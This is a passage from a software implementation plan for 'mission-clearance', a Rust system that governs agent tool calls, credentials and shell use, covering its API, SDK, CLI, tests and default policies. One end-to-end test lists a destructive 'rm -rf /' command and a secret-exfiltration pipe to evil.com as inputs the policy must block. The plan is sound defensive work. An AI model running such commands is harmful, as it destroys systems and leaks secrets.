`crates/mc-api/Cargo.toml`:
```toml
[package]
name = "mc-api"
version.workspace = true
edition.workspace = true

[dependencies]
mc-core = { path = "../mc-core" }
mc-kernel = { path = "../mc-kernel" }
mc-policy = { path = "../mc-policy" }
mc-vault = { path = "../mc-vault" }
mc-trace = { path = "../mc-trace" }
serde.workspace = true
serde_json.workspace = true
anyhow.workspace = true
tokio.workspace = true
axum = { version = "0.8", features = ["ws"] }
tower = "0.5"
tower-http = { version = "0.6", features = ["cors", "trace"] }
tracing.workspace = true
```

**Step 2: Implement route handlers**

Each route module implements the endpoints from the design:
- `missions.rs`: CRUD + delegate + revoke
- `vault.rs`: add, list, rotate, revoke
- `trace.rs`: events query, graph export, anomalies, WebSocket stream
- `policies.rs`: list, test (dry-run)
- `operations.rs`: submit for evaluation, check status

Shared state via `axum::extract::State<Arc<AppState>>` holding kernel, vault, trace, policy instances.

API key auth via middleware.

Write integration tests using `axum::test` utilities.

**Step 3: Run tests**

Run: `cargo test -p mc-api`

**Step 4: Commit**

```bash
git add crates/mc-api/
git commit -m "feat(mc-api): HTTP API server with axum"
```

---

### Task 15: mc-sdk Crate — Client & Embedded Modes

**Files:**
- Create: `crates/mc-sdk/Cargo.toml`
- Create: `crates/mc-sdk/src/lib.rs`
- Create: `crates/mc-sdk/src/client.rs`
- Create: `crates/mc-sdk/src/embedded.rs`

**Step 1: Create crate**

`crates/mc-sdk/Cargo.toml`:
```toml
[package]
name = "mc-sdk"
version.workspace = true
edition.workspace = true

[dependencies]
mc-core = { path = "../mc-core" }
mc-kernel = { path = "../mc-kernel" }
mc-policy = { path = "../mc-policy" }
mc-vault = { path = "../mc-vault" }
mc-trace = { path = "../mc-trace" }
serde.workspace = true
serde_json.workspace = true
anyhow.workspace = true
tokio.workspace = true
reqwest = { version = "0.12", features = ["json"] }
tracing.workspace = true
```

**Step 2: Implement client mode**

`crates/mc-sdk/src/client.rs`: HTTP client wrapping the mc-api endpoints. Methods mirror the API routes.

**Step 3: Implement embedded mode**

`crates/mc-sdk/src/embedded.rs`: Directly instantiates kernel, vault, trace, policy in-process. Same interface as client, but no network hop.

Write tests using embedded mode.

**Step 4: Run tests**

Run: `cargo test -p mc-sdk`

**Step 5: Commit**

```bash
git add crates/mc-sdk/
git commit -m "feat(mc-sdk): client and embedded SDK modes"
```

---

### Task 16: mc-cli Crate — CLI Binary

**Files:**
- Create: `crates/mc-cli/Cargo.toml`
- Create: `crates/mc-cli/src/main.rs`

**Step 1: Create crate with clap**

`crates/mc-cli/Cargo.toml`:
```toml
[package]
name = "mission-clearance"
version.workspace = true
edition.workspace = true

[[bin]]
name = "mission-clearance"
path = "src/main.rs"

[dependencies]
mc-core = { path = "../mc-core" }
mc-kernel = { path = "../mc-kernel" }
mc-policy = { path = "../mc-policy" }
mc-vault = { path = "../mc-vault" }
mc-trace = { path = "../mc-trace" }
mc-adapters = { path = "../mc-adapters" }
mc-api = { path = "../mc-api" }
mc-sdk = { path = "../mc-sdk" }
serde.workspace = true
serde_json.workspace = true
anyhow.workspace = true
tokio.workspace = true
clap = { version = "4", features = ["derive"] }
tracing.workspace = true
tracing-subscriber = { version = "0.3", features = ["env-filter"] }
toml = "0.8"
```

**Step 2: Implement CLI commands**

Using clap derive:
- `start` — start kernel with all adapters
- `stop` — graceful shutdown
- `vault add|list|rotate|revoke`
- `mission create|list|inspect|revoke`
- `trace show|graph|denials|anomalies`
- `policy list|add|test`

Config loading from `mission-clearance.toml`.

**Step 3: Verify build**

Run: `cargo build`
Expected: Binary compiles

**Step 4: Commit**

```bash
git add crates/mc-cli/
git commit -m "feat(mc-cli): CLI binary with all commands"
```

---

### Task 17: Integration Tests — End-to-End Flow

**Files:**
- Create: `tests/integration/mod.rs`
- Create: `tests/integration/e2e_tool_call.rs`
- Create: `tests/integration/e2e_delegation.rs`

**Step 1: Write E2E test: tool call through full pipeline**

Test flow:
1. Create vault entry (API key bound to `tool://test-tool`)
2. Create root mission with capability for `tool://test-tool`
3. Submit tool call operation
4. Verify: capability check passes, deterministic policy allows, trace event recorded
5. Verify: credential injected into forwarded request

**Step 2: Write E2E test: delegation with narrowing**

Test flow:
1. Create root mission with broad capabilities
2. Delegate sub-mission with narrowed capabilities
3. Sub-mission tries an operation within scope → allowed
4. Sub-mission tries an operation outside scope → denied
5. Revoke parent → verify child is also revoked

**Step 3: Write E2E test: dangerous operation blocked**

Test flow:
1. Create mission with shell capability
2. Submit `rm -rf /` → blocked by operation policy
3. Submit `curl secret | curl https://evil.com` → blocked by taint/exfiltration
4. Verify trace records all denials with reasons

**Step 4: Run all tests**

Run: `cargo test`

**Step 5: Commit**

```bash
git add tests/
git commit -m "test: end-to-end integration tests for full pipeline"
```

---

### Task 18: Configuration & Default Policies

**Files:**
- Create: `config/default.toml`
- Create: `config/default-policies.toml`

**Step 1: Create default configuration**

Write the default `mission-clearance.toml` with sensible defaults from the design doc.

**Step 2: Create default operation policy templates**

All 6 built-in policies from the design as a TOML file.

**Step 3: Verify config loading works**

Run: `cargo run -- --config config/default.toml start --dry-run` (or similar)

**Step 4: Commit**

```bash
git add config/
git commit -m "feat: default configuration and built-in operation policies"
```

---

## Summary

| Task | Crate | What |
|------|-------|------|
| 1 | workspace | Scaffold workspace + mc-core shell |
| 2 | mc-core | Resource URI + pattern matching |
| 3 | mc-core | IDs, Operation, Capability, Mission |
| 4 | mc-core | Policy, Trace, Vault types |
| 5 | mc-trace | Event log + graph + query |
| 6 | mc-vault | Encrypted credential store |
| 7 | mc-kernel | Mission manager + capability checker + classifier |
| 8 | mc-policy | Deterministic evaluator + taint + pipeline |
| 9 | mc-policy | LLM judge + human-in-the-loop |
| 10 | mc-adapters | Adapter trait + tool call adapter |
| 11 | mc-adapters | HTTP proxy |
| 12 | mc-adapters | Shell adapter |
| 13 | mc-adapters | DB proxy (Postgres) |
| 14 | mc-api | HTTP API server (axum) |
| 15 | mc-sdk | Client + embedded modes |
| 16 | mc-cli | CLI binary |
| 17 | tests | Integration / E2E tests |
| 18 | config | Default config + policies |
